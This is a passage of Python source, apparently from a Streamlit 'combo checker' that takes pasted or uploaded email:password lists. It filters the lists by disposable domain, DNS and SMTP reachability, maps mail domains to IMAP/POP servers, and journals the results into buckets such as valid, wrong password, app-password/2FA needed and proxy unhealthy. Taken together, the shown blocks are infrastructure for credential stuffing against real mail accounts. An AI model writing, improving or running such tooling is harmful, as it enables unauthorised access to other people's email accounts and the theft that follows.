# @@BLOCK 082 PREFILTER_TABLES deps=002,021,043
DISPOSABLE = {
    "tempmail.com", "temp-mail.org", "guerrillamail.com", "guerrillamail.org",
    "10minutemail.com", "10minutemail.net", "mailinator.com", "maildrop.cc",
    "yopmail.com", "yopmail.fr", "trashmail.com", "trashmail.me",
    "getnada.com", "throwawaymail.com", "fakeinbox.com", "sharklasers.com",
    "grr.la", "guerrillamailblock.com", "pokemail.net", "spam4.me",
    "dispostable.com", "mailnesia.com", "tempail.com", "emailondeck.com",
    "mohmal.com", "tempinbox.com", "mailcatch.com", "mailnull.com",
    "spamgourmet.com", "mytemp.email", "tmpmail.org", "tmpmail.net",
    "temp-mail.io", "1secmail.com", "1secmail.org", "1secmail.net",
}
COMMON_TYPOS = {
    "gmai.com", "gamil.com", "gmal.com", "gmial.com", "g-mail.com",
    "outloo.com", "outlok.com", "hotmial.com", "hotmai.com", "hotmali.com",
    "yaho.com", "yahooo.com", "yhoo.com", "iclound.com", "ezweb.ne",
}
STRICT_APP_PROVIDERS = STRICT_APP
ZERO_ACCESS_PROVIDERS = ZERO_ACCESS
EMAIL_REGEX = re.compile(r"^[\w\.-]+@[\w\.-]+\.\w+$")
DISPOSABLE_EXTRA = {"rerttymail.com", "tmpmail.org", "tmpmail.net", "tempmailo.com"}
# v13.66: THIS WAS A BARE NAME, so every user on the deployment shared one
# blocklist file in the working directory. It is this user's own file now, the
# same rule every other path in the app follows. Block 082 runs after
# auth.require(), so the unlocked prefix already exists here.
DISPOSABLE_FILE = user_file("disposable_domains.txt")


def load_disposable_set():
    found = set(DISPOSABLE) | set(DISPOSABLE_EXTRA)
    if os.path.exists(DISPOSABLE_FILE):
        try:
            with open(DISPOSABLE_FILE, encoding="utf-8", errors="ignore") as f:
                found.update(x.strip().lower() for x in f
                             if x.strip() and not x.startswith("#"))
        except Exception:
            pass
    if requests and len(found) < 500:
        try:
            r = requests.get(
                "https://raw.githubusercontent.com/disposable-email-domains/"
                "disposable-email-domains/master/disposable_email_blocklist.conf",
                timeout=8)
            if r.ok and r.text:
                found.update(x.strip().lower() for x in r.text.splitlines()
                             if x.strip() and not x.startswith("#"))
                with open(DISPOSABLE_FILE, "w", encoding="utf-8") as f:
                    f.write("\n".join(sorted(found)))
                log_startup(f"Disposable blocklist loaded: {len(found)}")
        except Exception as e:
            log_startup(f"Disposable list fetch skipped: {e}")
    return found


# FIX LAG-D (v13.49): load_disposable_set() does a blocking HTTP GET with an 8s
# timeout and it was called right here on the IMPORT path, so every cold deploy
# sat on it before the first paint. The static set covers the gap and the fetch
# now runs in the background; is_disposable() picks up the fuller set as soon as
# it lands.
DISPOSABLE_LIVE = set(DISPOSABLE) | set(DISPOSABLE_EXTRA)
if os.path.exists(DISPOSABLE_FILE):
    try:
        with open(DISPOSABLE_FILE, encoding="utf-8", errors="ignore") as _df:
            DISPOSABLE_LIVE.update(x.strip().lower() for x in _df
                                   if x.strip() and not x.startswith("#"))
    except Exception:
        pass
else:
    def _fetch_disposables_bg():
        global DISPOSABLE_LIVE
        try:
            DISPOSABLE_LIVE = set(load_disposable_set())
        except Exception:
            pass

    # v13.65: THE THREAD CARRIED NO SCRIPT-RUN CONTEXT, so every log_startup()
    # inside load_disposable_set() warned "missing ScriptRunContext" and its lines
    # were dropped instead of reaching the panel. The caller's context is attached
    # to the thread before it starts, so the log lands normally.
    _disp_thread = threading.Thread(target=_fetch_disposables_bg, daemon=True,
                                    name="disposable-fetch")
    try:
        from streamlit.runtime.scriptrunner import (
            add_script_run_ctx as _add_src, get_script_run_ctx as _get_src)
        _disp_ctx = _get_src()
    except Exception:
        _add_src = None
        _disp_ctx = None
    if _add_src is not None and _disp_ctx is not None:
        try:
            _add_src(_disp_thread, _disp_ctx)
        except Exception:
            pass
    _disp_thread.start()


def is_disposable(email):
    try:
        domain = email.split("@")[-1].lower().strip()
        if domain in DISPOSABLE_LIVE or domain in DISPOSABLE_EXTRA:
            return True
        return any(p in domain for p in ("tempmail", "rerttymail", "mailinator",
                                         "yopmail", "guerrilla", "throwaway",
                                         "10minute"))
    except Exception:
        return False
# @@END 082 PREFILTER_TABLES

# @@BLOCK 083 UNFINISHED_IO deps=004,007,040,082
def list_unfinished_runs():
    """Every unfinished record on disk, newest first.

    FIX RS-1: this used to call

        glob.glob(path, reverse=True)

    `reverse` is a sorted() keyword, not a glob() one, so the call raised
    TypeError and the bare `except Exception: pass` below swallowed it. This
    function therefore returned [] on EVERY call: the Resume Unfinished counter
    read 0, the inspector said "No items", and the results summary could never
    name a stop reason - while unfinished_live.json sat on disk holding the
    remaining lines. A substring gate cannot catch that, so test_resume_io.py
    now calls the expression.
    """
    runs = []
    _res = user_file("mail_results")
    try:
        os.makedirs(_res, exist_ok=True)
        paths = sorted(glob.glob(os.path.join(_res, "unfinished_*.json")), reverse=True)
    except Exception as e:
        warnings.warn(f"list_unfinished_runs: glob failed ({e})")
        return runs
    for path in paths:
        try:
            with open(path, encoding="utf-8") as f:
                data = json.load(f)
        except Exception:
            continue
        if isinstance(data, dict):
            data["file"] = path
            runs.append(data)
    return runs


def unfinished_remaining_count():
    """How many account LINES are resumable right now - not how many FILES.

    The metric sits in a row of account counts ("Ready to Check", "Disposables"),
    and len(list_unfinished_runs()) counts files. There is only ever one file, so
    a fixed glob alone would print 1 for 25 accounts.
    """
    return len(runstate.remaining())


def save_unfinished(reason, remaining, checked, total):
    """Write the resume record ATOMICALLY.

    runstate.interrupt() re-reads and rewrites unfinished_live.json while the
    loop's checkpoint may be mid-write; a plain truncating write can hand it a
    half file and the reason mirror is then lost.
    """
    _res = user_file("mail_results")
    os.makedirs(_res, exist_ok=True)
    path = os.path.join(_res, "unfinished_live.json")
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump({"id": "live", "reason": reason, "checked": checked, "total": total,
                   "remaining": remaining,
                   "saved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}, f)
    os.replace(tmp, path)
    return path


def clear_unfinished():
    path = os.path.join(user_file("mail_results"), "unfinished_live.json")
    if os.path.exists(path):
        try:
            os.remove(path)
        except Exception:
            pass


# ==========================================================================
# v13.67 - THE LIVE BUCKET JOURNAL
#
# THE BUG THIS CLOSES
# -------------------
# The twelve bucket files were written by ONE block only: the export block,
# which sits BELOW the run loop and runs only after the loop has ended. Any
# teardown - a rerun, a phone backgrounding the tab, a websocket drop, a
# redeploy - killed the script before it, so an interrupted run left NO bucket
# file at all.
#
# The only incremental writer in the whole file was _write_clean_valid(), which
# lands in clean_valid_accounts.txt and is re-read by
# load_persistent_valid_results(). So after a teardown the VALID bucket came
# back on reload and EVERY OTHER BUCKET came back empty - the reported symptom
# exactly, and it was never a crash.
#
# HOW IT WORKS
# ------------
# Each bucket gets an append handle for the life of the run, flushed per line,
# on the SAME filename the export block already uses (<tag>_<stamp>.txt), so
# _rehydrate_last_run() picks a live or interrupted run up with no change at
# all. The stamp is opened once, in the run-trigger block, and the export block
# re-uses it, so the live files and the exported files are the same files.
#
# ISOLATION
# ---------
# The directory comes from user_file("mail_results"), so the prefix is the
# unlocked hash. The handle table is keyed by _gate_scope(), so two people
# running at once hold separate handle sets and neither close() can shut the
# other's files. Every append and every close is given the scope explicitly by
# the caller, so nothing depends on a thread-local guess.
# ==========================================================================
_RUN_JOURNAL_TAGS = ("valid", "wrong", "need_app", "login_dropped", "failed",
                     "proxy_unhealthy", "retry_later", "rbl_blocked",
                     "smtp_failed", "dns_failed", "skipped", "unclassified")

# Status -> bucket tag. Both transport names land in `failed`, because the run
# loop routes FAILED and CONNECTION_FAILED to the same bucket.
_BUCKET_TAG_BY_STATUS = {
    VALID: "valid",
    WRONG: "wrong",
    APP: "need_app",
    LOGIN_DROPPED: "login_dropped",
    RETRY: "retry_later",
    RBL: "rbl_blocked",
    SMTP_FAILED: "smtp_failed",
    DNS_FAILED: "dns_failed",
    PROXY_UNHEALTHY: "proxy_unhealthy",
    SKIP: "skipped",
    UNKNOWN: "unclassified",
    FAILED: "failed",
    CONNECTION_FAILED: "failed",
}

_JOURNAL_LOCK = threading.Lock()
# scope -> {"stamp": str, "handles": {tag: file handle}}
_JOURNAL = {}


def live_journal_open(stamp, scope=None):
    """Open one append handle per bucket for THIS run stamp and scope."""
    who = str(scope or _gate_scope())
    live_journal_close(who)
    _dir = user_file("mail_results")
    try:
        os.makedirs(_dir, exist_ok=True)
    except Exception:
        pass
    _h = {}
    for _tag in _RUN_JOURNAL_TAGS:
        try:
            _h[_tag] = open(os.path.join(_dir, f"{_tag}_{stamp}.txt"), "a",
                            encoding="utf-8", errors="ignore")
        except Exception:
            pass
    with _JOURNAL_LOCK:
        _JOURNAL[who] = {"stamp": str(stamp or ""), "handles": _h}


def live_journal_append(tag, line, scope=None):
    """Append one result line to its bucket file and flush it.

    Flushed per line, so a teardown loses at most the single line in flight and
    never a whole run.
    """
    if not tag or not line:
        return
    who = str(scope or _gate_scope())
    with _JOURNAL_LOCK:
        _h = (_JOURNAL.get(who) or {}).get("handles") or {}
        fh = _h.get(tag)
    if fh is None:
        return
    try:
        fh.write(str(line).rstrip("\n") + "\n")
        fh.flush()
    except Exception:
        pass


def live_journal_close(scope=None):
    """Close handles. With no scope, every scope. Safe to call twice."""
    if scope is None:
        with _JOURNAL_LOCK:
            keys = list(_JOURNAL)
    else:
        keys = [str(scope)]
    with _JOURNAL_LOCK:
        for _k in keys:
            for _fh in list((_JOURNAL.get(_k) or {}).get("handles", {}).values()):
                try:
                    _fh.close()
                except Exception:
                    pass
            _JOURNAL.pop(_k, None)
# @@END 083 UNFINISHED_IO

# @@BLOCK 084 DOMAIN_RESOLVE deps=039,052,058
def check_domain_resolvable(domain, persist=True):
    with cache_lock:
        if domain in domain_cache and "resolvable" in domain_cache[domain]:
            return domain_cache[domain]["resolvable"]
    resolvable = False
    try:
        if dns:
            try:
                if dns.resolver.resolve(domain, "MX"):
                    resolvable = True
            except Exception:
                try:
                    if dns.resolver.resolve(domain, "A"):
                        resolvable = True
                except Exception:
                    pass
        if not resolvable:
            socket.gethostbyname(domain)
            resolvable = True
    except Exception:
        resolvable = False
    with cache_lock:
        domain_cache.setdefault(domain, {})["resolvable"] = resolvable
    if persist:
        save_domain_cache()
    return resolvable
# @@END 084 DOMAIN_RESOLVE

# @@BLOCK 085 PREV_VALID_IO deps=037,038
def load_previous_valid():
    now = time.time()
    who = _cache_owner()
    if (_PREV_VALID_CACHE["data"]
            and _PREV_VALID_CACHE.get("user") == who
            and (now - _PREV_VALID_CACHE["ts"]) < 20.0):
        return set(_PREV_VALID_CACHE["data"])
    seen = set()
    try:
        _res = user_file("mail_results")
        paths = sorted(glob.glob(os.path.join(_res, "valid_*.txt")), reverse=True)
        for extra in ("valid_accounts.txt", "clean_valid_accounts.txt"):
            _p = user_file(extra)
            if os.path.exists(_p):
                paths.append(_p)
        for path in paths:
            try:
                with open(path, encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#") and ":" in line:
                            email = line.split(":", 1)[0].strip().lower()
                            if email and "@" in email:
                                seen.add(email)
            except Exception:
                continue
        log_startup(f"Loaded {len(seen)} previously validated unique email accounts.")
    except Exception as e:
        log_startup(f"WARNING: Error loading previous valid accounts: {e}")
    _PREV_VALID_CACHE["ts"] = now
    _PREV_VALID_CACHE["user"] = who
    _PREV_VALID_CACHE["data"] = set(seen)
    return seen


def _domains_in_text(text):
    out = []
    for line in (text or "").splitlines():
        line = line.strip()
        if not line or line.startswith("#") or ":" not in line:
            continue
        em = line.split(":", 1)[0].strip().lower()
        if "@" in em:
            d = em.split("@")[-1]
            if d and d not in out:
                out.append(d)
    return out
# @@END 085 PREV_VALID_IO

# @@BLOCK 086 PROCESS_ACCOUNTS deps=021,038,058,068,082,084,085
def process_accounts(text, previous_valid):
    lines = []
    disp_list, typo_list, resume_list, app_skip_list, custom_list = [], [], [], [], []
    dns_fail_list, smtp_fail_list = [], []
    whitelist = CFG.get("CUSTOM_WHITELIST", [])
    blacklist = CFG.get("CUSTOM_BLACKLIST", [])

    for line in text.splitlines():
        line = line.strip().lstrip('\ufeff').strip('"').strip("'").strip()
        if not line or line.startswith("#") or ":" not in line:
            continue
        parts = line.split(":", 1)
        email = parts[0].strip().lower()
        password = parts[1].strip() if len(parts) > 1 else ""
        if not email or "@" not in email or not password:
            continue
        # v13.53: EMAIL_REGEX was gated on FAST_MODE, so Normal and Deep accepted
        # malformed addresses that Fast dropped - the same input produced a
        # different clean list depending on an unrelated speed switch. It is
        # applied in every mode now.
        if not EMAIL_REGEX.match(email):
            continue
        domain = email.split("@")[-1].lower()
        # v13.53: whitelist wins. Both lists used to `continue` into the same
        # bucket with the whitelist checked first but not exempting anything, so
        # a domain on both lists was silently dropped by the blacklist.
        if whitelist and domain not in whitelist:
            custom_list.append(line)
            continue
        if blacklist and domain in blacklist and domain not in whitelist:
            custom_list.append(line)
            continue
        if CFG.get("SKIP_STRICT_APP_PROVIDERS", False) and domain in STRICT_APP_PROVIDERS:
            app_skip_list.append(line)
            continue
        if is_disposable(email):
            disp_list.append(line)
            continue
        if domain in COMMON_TYPOS:
            typo_list.append(line)
            continue
        if email in previous_valid:
            resume_list.append(line)
            continue
        if ".." in email or email.count("@") != 1:
            continue
        if not check_domain_resolvable(domain, persist=False):
            dns_fail_list.append(line)
            continue
        lines.append(f"{email}:{password}")

    save_domain_cache()

    if CFG.get("SMTP_CHECK", False) and lines:
        domains = list(dict.fromkeys(l.split(":", 1)[0].split("@")[-1].lower()
                                     for l in lines if "@" in l))
        results = smtp_precheck_domains(domains)
        keep = []
        for l in lines:
            d = l.split(":", 1)[0].split("@")[-1].lower()
            if results.get(d) is False:
                smtp_fail_list.append(l)
            else:
                keep.append(l)
        lines = keep
        dead = sum(1 for v in results.values() if v is False)
        log_startup(f"SMTP pre-check: {len(results)} domain(s) probed, {dead} dead, "
                    f"{len(smtp_fail_list)} account(s) bucketed.")

    seen_email, clean = set(), []
    for line in lines:
        em = line.split(":", 1)[0].strip().lower()
        if em not in seen_email:
            seen_email.add(em)
            clean.append(line)

    log_startup(
        f"Processed account input. Clean valid count ready: {len(clean)} "
        f"(Filtered DNS failures: {len(dns_fail_list)}, SMTP failures: {len(smtp_fail_list)})"
    )
    return (clean, disp_list, typo_list, resume_list, app_skip_list, custom_list,
            dns_fail_list, smtp_fail_list)
# @@END 086 PROCESS_ACCOUNTS

# @@BLOCK 087 INPUT_UI deps=019,034,035,039,055,082,083,085,086
# ---- single BUCKET table (was RESULT_INSPECT + RESULT_ACTION_MODES duplicated) ----
PREFILTER_LABELS = [
    "Ready to Check", "Resume Unfinished", "Disposables", "Typos",
    "Skip previously valid", "App-Skipped", "Custom Filtered",
    "DNS Failed", "SMTP Failed",
]
BUCKETS = [
    ("✅ Valid Found", "valid_results"),
    ("❌ Wrong Password Found", "wrong_results"),
    ("🔐 App Password / 2FA Found", "need_app_results"),
    ("🚪 Login Dropped (* BYE) Found", "login_drop_results"),
    ("🕓 RETRY_LATER Found", "retry_results"),
    ("🚫 RBL Blocked Found", "rbl_results"),
    ("🔌 Connection Failed Found", "conn_results"),
    ("🩹 Proxy Unhealthy Found", "proxy_results"),
    ("⏭ Skipped / Filtered Found", "skip_results"),
    ("❓ Unclassified Found", "unknown_results"),
]
BUCKET_TAGS = {
    "valid_results": "VALID", "wrong_results": "WRONG_PASSWORD",
    "conn_results": "CONNECTION_FAILED", "proxy_results": "PROXY_UNHEALTHY",
    "need_app_results": "NEED_APP_PASSWORD", "login_drop_results": "LOGIN_DROPPED",
    "retry_results": "RETRY_LATER", "rbl_results": "RBL_BLOCKED",
    "smtp_results": "SMTP_FAILED", "dns_results": "DNS_FAILED",
    "skip_results": "SKIPPED", "unknown_results": "UNCLASSIFIED",
}

# ==========================================================================
# v13.63 - THE PASTE BOX AND THE INSPECTOR CHOICE NOW SURVIVE A REFRESH
#
# key="bb_raw_text" / key="bb_inspect_cat" only ever made the two widgets
# survive a RERUN. A refresh, a tab close, a reaped session or a redeploy handed
# both back at their defaults, and a 3000-line paste is the most expensive thing
# on this page to retype.
#
# Both are per-user FILES now (the unlocked prefix, exactly like every other
# per-user file), seeded BEFORE the widget is created and rewritten from an
# on_change callback - a callback runs BEFORE the script body, so no widget key
# is ever touched after the widget has been instantiated.
# ==========================================================================
_PASTE_FILE = user_file("paste_accounts.txt")
_INSPECT_FILE = user_file("inspect_cat.txt")
# v13.70: 8 MB was ~260,000 lines of restored text held as ONE string in
# session_state, and MAX_ACCOUNTS caps a run at 5000 - so seven eighths of it
# was text nothing would ever dial. 2 MB is ~65,000 lines and still far past any
# single run.
_PASTE_MAX = 2 * 1024 * 1024
_INPUT_OWNER_KEY = "_input_owner"
_PASTE_LIMIT_NOTE = ""


def _read_text_file(path, cap=4096):
    try:
        if os.path.exists(path):
            with open(path, encoding="utf-8", errors="ignore") as f:
                return f.read(cap)
    except Exception as e:
        warnings.warn(f"could not read {path}: {e}")
    return ""


def _write_text_file(path, text):
    tmp = path + ".tmp"
    try:
        with file_write_lock:
            with open(tmp, "w", encoding="utf-8") as f:
                f.write(text or "")
            os.replace(tmp, path)
    except Exception as e:
        warnings.warn(f"could not write {path}: {e}")


def _read_paste():
    global _PASTE_LIMIT_NOTE
    try:
        if os.path.exists(_PASTE_FILE):
            _sz = os.path.getsize(_PASTE_FILE)
            if _sz > _PASTE_MAX:
                _PASTE_LIMIT_NOTE = (f"Only the first {_PASTE_MAX // 1024} KB of a "
                                     f"{_sz // 1024} KB paste was restored.")
    except Exception:
        pass
    return _read_text_file(_PASTE_FILE, _PASTE_MAX)


def _on_paste_change():
    _write_text_file(_PASTE_FILE, str_lit.session_state.get("bb_raw_text", ""))


def _on_paste_clear():
    str_lit.session_state["bb_raw_text"] = ""
    _write_text_file(_PASTE_FILE, "")


def _on_inspect_change():
    _write_text_file(_INSPECT_FILE,
                     str(str_lit.session_state.get("bb_inspect_cat", ""))[:200])


# ---- owner gate: a second unlock in this tab must not inherit the last one ----
_input_owner = _cache_owner()
if str_lit.session_state.get(_INPUT_OWNER_KEY) != _input_owner:
    str_lit.session_state.pop("bb_raw_text", None)
    str_lit.session_state.pop("bb_inspect_cat", None)
    str_lit.session_state[_INPUT_OWNER_KEY] = _input_owner
if "bb_raw_text" not in str_lit.session_state:
    str_lit.session_state["bb_raw_text"] = _read_paste()

section_title("📥", "Accounts Input & Pre-Filtering",
              "paste combos or upload a file - junk is filtered before the engine runs")

input_tab1, input_tab2 = str_lit.tabs(["📝 Paste Combos", "📁 Upload Combo File"])
raw_text = ""
with input_tab1:
    _ph1, _ph2 = str_lit.columns([0.62, 0.38])
    with _ph1:
        str_lit.caption("Saved to your own paste file - it survives a refresh, a tab "
                        "close and a redeploy.")
    with _ph2:
        str_lit.button("🧹 Clear paste", width="stretch", on_click=_on_paste_clear,
                       help="Empties the box AND the saved copy.")
    raw_text = str_lit.text_area(
        "Paste accounts here (email:password format):",
        placeholder="user@example.com:password123", height=260,
        key="bb_raw_text", on_change=_on_paste_change)
    if _PASTE_LIMIT_NOTE:
        str_lit.caption(_PASTE_LIMIT_NOTE)
with input_tab2:
    uploaded_file = str_lit.file_uploader("Upload .txt combo file", type=["txt"],
                                          key="bb_upload")   # FIX P1-2
    if uploaded_file is not None:
        try:
            file_bytes = uploaded_file.getvalue()
            if not file_bytes:
                str_lit.warning("Uploaded file is empty.")
                raw_text = ""
            else:
                try:
                    raw_text = file_bytes.decode("utf-8", errors="ignore")
                except Exception:
                    raw_text = file_bytes.decode("latin-1", errors="ignore")
                # v13.63: the upload is written to the paste file too, so the
                # numbers do not vanish on the next refresh. Guarded by a
                # signature so a 3000-line file is not rewritten on every rerun.
                _up_sig = (len(raw_text), hash(raw_text))
                if str_lit.session_state.get("_paste_saved_sig") != _up_sig:
                    _write_text_file(_PASTE_FILE, raw_text)
                    str_lit.session_state["_paste_saved_sig"] = _up_sig
                str_lit.success("File uploaded successfully - and saved, so it "
                                "survives a refresh.")
        except Exception as e:
            str_lit.error(f"Failed decoding uploaded file: {e}")
            raw_text = ""
    elif str_lit.session_state.get("bb_raw_text"):
        str_lit.caption("Nothing uploaded - the paste box is driving the counts.")

clean_lines = []
disp, typo, resume, app_skip, custom_skipped, dns_skipped, smtp_skipped = [], [], [], [], [], [], []
# v13.66: this checkbox had NO key, so it was re-created with value=True on
# every rerun and unticking it was undone by the next click anywhere. Seeded,
# then created with key= only.
_seed_widget("bb_skip_prev", dflt=True)
skip_previous = str_lit.checkbox(
    "Skip previously valid", key="bb_skip_prev",
    help="On: lines already in old valid files are not checked again.")

if raw_text:
    previous_valid = load_previous_valid() if skip_previous else set()

    _pf_fp = (
        len(raw_text), hash(raw_text), bool(skip_previous), len(previous_valid),
        tuple(CFG.get("CUSTOM_WHITELIST", [])), tuple(CFG.get("CUSTOM_BLACKLIST", [])),
        bool(CFG.get("FAST_MODE")), bool(CFG.get("SKIP_STRICT_APP_PROVIDERS")),
        bool(CFG.get("SMTP_CHECK")),
    )
    _pf_cache = str_lit.session_state.get("_bb_prefilter_cache") or {}
    _pf_data = _pf_cache.get("data") if _pf_cache.get("fp") == _pf_fp else None
    if _pf_data is None:
        try:
            _pending_smtp = ([d for d in _domains_in_text(raw_text) if not smtp_cached(d)]
                             if CFG.get("SMTP_CHECK", False) else [])
            if _pending_smtp:
                with str_lit.spinner(f"🛰 SMTP reachability pre-check on "
                                     f"{len(_pending_smtp)} new domain(s)..."):
                    _pf_data = process_accounts(raw_text, previous_valid)
            else:
                _pf_data = process_accounts(raw_text, previous_valid)
        except Exception as _pf_err:
            str_lit.exception(_pf_err)
            _pf_data = ([], [], [], [], [], [], [], [])
        str_lit.session_state["_bb_prefilter_cache"] = {"fp": _pf_fp, "data": _pf_data}
    (clean_lines, disp, typo, resume, app_skip,
     custom_skipped, dns_skipped, smtp_skipped) = _pf_data

    str_lit.session_state.pre_dns_failed = list(dns_skipped)
    str_lit.session_state.pre_smtp_failed = list(smtp_skipped)

    # FIX RS-2: this counted FILES (there is only ever one) and read a glob that
    # raised TypeError, so it read 0 no matter what was on disk. It now counts
    # the resumable LINES, which is what the label promises and what the row of
    # neighbouring account counts means.
    unfinished_count = unfinished_remaining_count()
    _pf_metrics = [
        ("Ready to Check", len(clean_lines)),
        ("Resume Unfinished", unfinished_count),
        ("Disposables", len(disp)),
        ("Typos", len(typo)),
        ("Skip previously valid", len(resume)),
        ("App-Skipped", len(app_skip)),
        ("Custom Filtered", len(custom_skipped)),
        ("DNS Failed", len(dns_skipped)),
        ("SMTP Failed", len(smtp_skipped)),
    ]
    for _pc, (_pl, _pv) in zip(metric_grid(_pf_metrics, per_row=3), _pf_metrics):
        _pc.metric(_pl, _pv)

# --------------------------------------------------------------------------
# INSPECTOR - v13.63
#
# Three separate faults, all fixed here:
#   * it lived inside `if raw_text:`, so with an empty paste box the result
#     buckets could not be inspected at all. It is module level now.
#   * the list was an uncapped st.code, so 3445 rows pushed the selectbox off
#     the top of the screen and you had to drag the whole page to reach it. It
#     is a fixed-height scroller (420px) inside an expander now: the page stops
#     growing and the box can be opened and closed.
#   * the choice was session-only. It is a per-user file now, validated against
#     the CURRENT option list so a retired value can never raise.
# --------------------------------------------------------------------------
inspect_options = list(PREFILTER_LABELS) + [label for label, _ in BUCKETS]

if "bb_inspect_cat" not in str_lit.session_state:
    str_lit.session_state["bb_inspect_cat"] = _read_text_file(_INSPECT_FILE, 200).strip()
if str_lit.session_state.get("bb_inspect_cat") not in inspect_options:
    str_lit.session_state["bb_inspect_cat"] = inspect_options[0]

section_title("🔍", "Filter & Result Categories Inspector",
              "open the box, pick ONE category - the list scrolls in place")

# FIX RS-3: the preview used to append a metadata line per run into the SAME
# list as the account lines, so "Showing N items" counted headers too. The
# metadata is a caption now and the list holds account lines only.
unfinished_runs = list_unfinished_runs()
unfinished_preview = []
for run in unfinished_runs:
    unfinished_preview.extend(run.get("remaining") or [])

category_map = {
    "Ready to Check": clean_lines,
    "Resume Unfinished": unfinished_preview,
    "Disposables": disp,
    "Typos": typo,
    "Skip previously valid": resume,
    "App-Skipped": app_skip,
    "Custom Filtered": custom_skipped,
    "DNS Failed": dns_skipped,
    "SMTP Failed": smtp_skipped,
}
for _b_lbl, _b_key in BUCKETS:
    category_map[_b_lbl] = list(str_lit.session_state.get(_b_key, []))

with str_lit.expander("🔎 Inspect the contents of one category", expanded=False):
    filter_category_choice = str_lit.selectbox(
        "Select category to inspect contents:", options=inspect_options,
        key="bb_inspect_cat", on_change=_on_inspect_change)

    if unfinished_runs:
        _r0 = unfinished_runs[0]
        str_lit.caption(
            f"Record: {_r0.get('saved_at', '?')} | reason: {_r0.get('reason', '?')} | "
            f"{_r0.get('checked', 0)}/{_r0.get('total', 0)} checked at stop")

    selected_list_items = category_map.get(filter_category_choice, [])
    if not selected_list_items:
        str_lit.info(f"No items in **{filter_category_choice}**.")
    else:
        _ih1, _ih2 = str_lit.columns([0.6, 0.4])
        with _ih1:
            str_lit.info(f"Showing **{len(selected_list_items)}** items for "
                         f"**{filter_category_choice}** - the box scrolls, the page "
                         f"does not grow.")
        with _ih2:
            _safe_cat = re.sub(r"[^a-z0-9]+", "_",
                               filter_category_choice.lower()).strip("_") or "items"
            str_lit.download_button(
                f"⬇️ Download all {len(selected_list_items)}",
                data="\n".join(str(i) for i in selected_list_items).encode("utf-8"),
                file_name=f"{_safe_cat}_{len(selected_list_items)}.txt",
                mime="text/plain", width="stretch", key=f"inspdl_{_safe_cat}")
        with str_lit.container(height=420):
            str_lit.code("\n".join(str(i) for i in selected_list_items), language="text")
# @@END 087 INPUT_UI

# @@BLOCK 088 PROVIDER_TABLES deps=002,052
PROVIDER_MAP = {
    "gmail.com": {"imap": ["imap.gmail.com", "mail.gmail.com"], "pop": ["pop.gmail.com"], "pop3": ["pop.gmail.com"]},
    "googlemail.com": {"imap": ["imap.gmail.com", "mail.gmail.com"], "pop": ["pop.gmail.com"], "pop3": ["pop.gmail.com"]},
    "outlook.com": {"imap": ["outlook.office365.com", "mail.outlook.com"], "pop": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
    "hotmail.com": {"imap": ["outlook.office365.com", "mail.hotmail.com"], "pop": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
    "live.com": {"imap": ["outlook.office365.com", "mail.live.com"], "pop": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
    "yahoo.com": {"imap": ["imap.mail.yahoo.com", "mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "btinternet.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "bt.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "btopenworld.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "talk21.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "sky.com": {"imap": ["imap.tools.sky.com"], "pop": ["imap.tools.sky.com"], "pop3": ["imap.tools.sky.com"]},
    "virginmedia.com": {"imap": ["imap.virginmedia.com"], "pop": ["imap.virginmedia.com"], "pop3": ["imap.virginmedia.com"]},
    "ntlworld.com": {"imap": ["imap.virginmedia.com"], "pop": ["imap.virginmedia.com"], "pop3": ["imap.virginmedia.com"]},
    "blueyonder.co.uk": {"imap": ["imap.virginmedia.com"], "pop": ["imap.virginmedia.com"], "pop3": ["imap.virginmedia.com"]},
    "icloud.com": {"imap": ["imap.mail.me.com", "mail.icloud.com"], "pop": ["pop.mail.me.com"], "pop3": ["pop.mail.me.com"]},
    "naver.com": {"imap": ["imap.naver.com", "mail.naver.com"], "pop": ["pop.naver.com"], "pop3": ["pop.naver.com"]},
    "qq.com": {"imap": ["imap.qq.com", "mail.qq.com"], "pop": ["pop.qq.com"], "pop3": ["pop.qq.com"]},
}
PARENT_PROVIDER_MAPPINGS = PARENT


def get_mx_hosts(domain):
    if not dns:
        return []
    try:
        return [str(r.exchange).lower().rstrip(".")
                for r in sorted(dns.resolver.resolve(domain, "MX"),
                                key=lambda x: x.preference)]
    except Exception:
        return []


def detect_parent_provider(domain):
    if domain in PARENT_PROVIDER_MAPPINGS:
        return PARENT_PROVIDER_MAPPINGS[domain]
    for m in get_mx_hosts(domain):
        ml = m.lower()
        if "biglobe" in ml:
            return "biglobe.ne.jp"
        if "google" in ml or "gmail" in ml:
            return "gmail.com"
        if "outlook" in ml or "protection.outlook" in ml:
            return "outlook.office365.com"
        if "yahoo" in ml:
            return "yahoo.com"
    return None
# @@END 088 PROVIDER_TABLES

# @@BLOCK 089 MX_PARENT deps=088
def _location_tokens_from_mx(mx_records, domain):
    toks = []
    for mx in (mx_records or [])[:3]:
        for part in re.split(r"[.\-]", mx or ""):
            p = part.strip().lower()
            if not p or p in toks or p in domain or p in ("com", "net", "org",
                                                          "edu", "gov", "co", "mail"):
                continue
            if re.match(r"^(mx|mta|smtp|relay|inbound|outbound|zcs|srv|edge|filter|"
                        r"cluster|mailrouter)\d*$", p):
                continue
            toks.append(p)
    return toks[:1]


def _expand_cnames(hosts, limit=6):
    if not dns:
        return list(hosts)
    out = []
    for h in hosts:
        if h not in out:
            out.append(h)
        if len(out) >= limit:
            break
        try:
            for r in dns.resolver.resolve(h, "CNAME", lifetime=2):
                t = str(r.target).rstrip(".").lower()
                if t and t not in out:
                    out.append(t)
        except Exception:
            pass
    return out
# @@END 089 MX_PARENT

# @@BLOCK 090 CANDIDATE_GEN deps=002,088,089
